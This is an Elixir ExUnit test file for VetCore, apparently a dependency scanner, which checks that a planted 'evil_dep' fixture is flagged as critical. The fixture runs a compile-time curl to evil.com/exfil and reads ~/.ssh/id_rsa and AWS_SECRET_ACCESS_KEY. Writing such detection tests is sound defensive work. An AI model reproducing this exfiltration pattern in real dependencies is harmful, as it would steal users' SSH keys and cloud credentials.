defmodule VetCore.Integration.FullScanTest do
  use ExUnit.Case, async: true

  alias VetCore.Types.{ScanReport, DependencyReport}

  setup do
    tmp_dir = Path.join(System.tmp_dir!(), "vet_full_scan_test_#{System.unique_integer([:positive])}")
    File.mkdir_p!(tmp_dir)

    on_exit(fn -> File.rm_rf!(tmp_dir) end)
    %{project_path: tmp_dir}
  end

  defp write_lock_file!(project_path) do
    lock_content = ~s(%{\n  "evil_dep": {:hex, :evil_dep, "0.1.0", "abc123", [:mix], [], "hexpm", "def456"},\n  "clean_dep": {:hex, :clean_dep, "1.0.0", "aaa111", [:mix], [], "hexpm", "bbb222"},\n  "rustler": {:hex, :rustler, "0.30.0", "ccc333", [:mix], [], "hexpm", "ddd444"},\n})
    File.write!(Path.join(project_path, "mix.lock"), lock_content)
  end

  defp write_evil_dep!(project_path) do
    dep_dir = Path.join([project_path, "deps", "evil_dep", "lib"])
    File.mkdir_p!(dep_dir)

    evil_source = ~S"""
    defmodule Evil do
      @secret System.cmd("curl", ["https://evil.com/exfil"])

      def steal do
        File.read!(Path.expand("~/.ssh/id_rsa"))
        System.get_env("AWS_SECRET_ACCESS_KEY")
      end
    end
    """

    File.write!(Path.join(dep_dir, "evil.ex"), evil_source)

    mix_dir = Path.join([project_path, "deps", "evil_dep"])

    mix_source = ~S"""
    defmodule EvilDep.MixProject do
      use Mix.Project

      def project do
        [app: :evil_dep, version: "0.1.0"]
      end
    end
    """

    File.write!(Path.join(mix_dir, "mix.exs"), mix_source)
  end

  defp write_clean_dep!(project_path) do
    dep_dir = Path.join([project_path, "deps", "clean_dep", "lib"])
    File.mkdir_p!(dep_dir)

    clean_source = ~S"""
    defmodule Clean do
      def hello, do: :world
      def add(a, b), do: a + b
    end
    """

    File.write!(Path.join(dep_dir, "clean.ex"), clean_source)

    mix_dir = Path.join([project_path, "deps", "clean_dep"])

    mix_source = ~S"""
    defmodule CleanDep.MixProject do
      use Mix.Project

      def project do
        [app: :clean_dep, version: "1.0.0"]
      end
    end
    """

    File.write!(Path.join(mix_dir, "mix.exs"), mix_source)
  end

  defp write_rustler_dep!(project_path) do
    dep_dir = Path.join([project_path, "deps", "rustler", "lib"])
    File.mkdir_p!(dep_dir)

    rustler_source = ~S"""
    defmodule Rustler do
      def compile do
        System.cmd("cargo", ["build"])
      end
    end
    """

    File.write!(Path.join(dep_dir, "rustler.ex"), rustler_source)

    mix_dir = Path.join([project_path, "deps", "rustler"])

    mix_source = ~S"""
    defmodule Rustler.MixProject do
      use Mix.Project

      def project do
        [app: :rustler, version: "0.30.0"]
      end
    end
    """

    File.write!(Path.join(mix_dir, "mix.exs"), mix_source)
  end

  defp setup_full_project(project_path) do
    write_lock_file!(project_path)
    write_evil_dep!(project_path)
    write_clean_dep!(project_path)
    write_rustler_dep!(project_path)
  end

  describe "VetCore.scan/2 full pipeline" do
    test "returns {:ok, %ScanReport{}} with skip_hex: true", %{project_path: project_path} do
      setup_full_project(project_path)

      assert {:ok, %ScanReport{} = report} = VetCore.scan(project_path, skip_hex: true)
      assert report.project_path == project_path
      assert %DateTime{} = report.timestamp
    end

    test "ScanReport contains correct number of dependency_reports", %{project_path: project_path} do
      setup_full_project(project_path)

      {:ok, report} = VetCore.scan(project_path, skip_hex: true)
      assert length(report.dependency_reports) == 3
    end

    test "each DependencyReport has a risk_score and risk_level", %{project_path: project_path} do
      setup_full_project(project_path)

      {:ok, report} = VetCore.scan(project_path, skip_hex: true)

      for dep_report <- report.dependency_reports do
        assert %DependencyReport{} = dep_report
        assert is_integer(dep_report.risk_score)
        assert dep_report.risk_level in [:low, :medium, :high, :critical]
      end
    end

    test "findings from multiple checks are collected for evil_dep", %{project_path: project_path} do
      setup_full_project(project_path)

      {:ok, report} = VetCore.scan(project_path, skip_hex: true)

      evil_report =
        Enum.find(report.dependency_reports, fn dr -> dr.dependency.name == :evil_dep end)

      assert evil_report != nil
      # evil_dep should have findings from system_exec, file_access, and env_access at minimum
      categories = evil_report.findings |> Enum.map(& &1.category) |> Enum.uniq()
      assert :system_exec in categories
      assert :env_access in categories
    end

    test "compile-time findings in module body are classified correctly", %{project_path: project_path} do
      setup_full_project(project_path)

      {:ok, report} = VetCore.scan(project_path, skip_hex: true)

      evil_report =
        Enum.find(report.dependency_reports, fn dr -> dr.dependency.name == :evil_dep end)

      compile_time_findings = Enum.filter(evil_report.findings, & &1.compile_time?)
      assert length(compile_time_findings) > 0

      # The @secret = System.cmd(...) in module body should be compile-time
      system_cmd_ct =
        Enum.find(compile_time_findings, fn f ->
          f.category == :system_exec
        end)

      assert system_cmd_ct != nil
      assert system_cmd_ct.compile_time? == true
    end

    test "runtime findings in function body are classified correctly", %{project_path: project_path} do
      setup_full_project(project_path)

      {:ok, report} = VetCore.scan(project_path, skip_hex: true)

      evil_report =
        Enum.find(report.dependency_reports, fn dr -> dr.dependency.name == :evil_dep end)

      runtime_findings = Enum.reject(evil_report.findings, & &1.compile_time?)
      assert length(runtime_findings) > 0

      # File.read! and System.get_env inside def steal are runtime
      runtime_categories = runtime_findings |> Enum.map(& &1.category) |> Enum.uniq()
      assert :env_access in runtime_categories or :file_access in runtime_categories
    end

    test "summary field has correct total_deps and total_findings", %{project_path: project_path} do
      setup_full_project(project_path)

      {:ok, report} = VetCore.scan(project_path, skip_hex: true)

      assert report.summary.total_deps == 3

      actual_findings =
        report.dependency_reports |> Enum.map(fn dr -> length(dr.findings) end) |> Enum.sum()

      assert report.summary.total_findings == actual_findings
    end

    test "allowlisted deps get their findings filtered out", %{project_path: project_path} do
      setup_full_project(project_path)

      {:ok, report} = VetCore.scan(project_path, skip_hex: true)

      rustler_report =
        Enum.find(report.dependency_reports, fn dr -> dr.dependency.name == :rustler end)

      # rustler is allowlisted for :system_exec, so System.cmd findings should be filtered
      system_exec_findings =
        Enum.filter(rustler_report.findings, fn f -> f.category == :system_exec end)

      assert system_exec_findings == []
    end

    test "dependencies with no findings get risk_score 0 and risk_level :low", %{project_path: project_path} do
      setup_full_project(project_path)

      {:ok, report} = VetCore.scan(project_path, skip_hex: true)

      clean_report =
        Enum.find(report.dependency_reports, fn dr -> dr.dependency.name == :clean_dep end)

      assert clean_report.findings == []
      assert clean_report.risk_score == 0
      assert clean_report.risk_level == :low
    end
  end

  describe "malicious dep detection" do
    test "evil_dep has multiple findings with highest severity :critical", %{project_path: project_path} do
      setup_full_project(project_path)

      {:ok, report} = VetCore.scan(project_path, skip_hex: true)

      evil_report =
        Enum.find(report.dependency_reports, fn dr -> dr.dependency.name == :evil_dep end)

      assert length(evil_report.findings) > 1

      severities = Enum.map(evil_report.findings, & &1.severity)
      assert :critical in severities
    end

    test "evil_dep has compile_time? true for the module attribute System.cmd", %{project_path: project_path} do
      setup_full_project(project_path)

      {:ok, report} = VetCore.scan(project_path, skip_hex: true)

      evil_report =
        Enum.find(report.dependency_reports, fn dr -> dr.dependency.name == :evil_dep end)

      ct_system_cmd =
        Enum.find(evil_report.findings, fn f ->
          f.category == :system_exec and f.compile_time?
        end)

      assert ct_system_cmd != nil
      assert ct_system_cmd.severity == :critical
    end
  end

  describe "clean dep detection" do
    test "clean_dep has no findings, risk_score 0, risk_level :low", %{project_path: project_path} do
      setup_full_project(project_path)

      {:ok, report} = VetCore.scan(project_path, skip_hex: true)

      clean_report =
        Enum.find(report.dependency_reports, fn dr -> dr.dependency.name == :clean_dep end)

      assert clean_report.findings == []
      assert clean_report.risk_score == 0
      assert clean_report.risk_level == :low
    end
  end
end
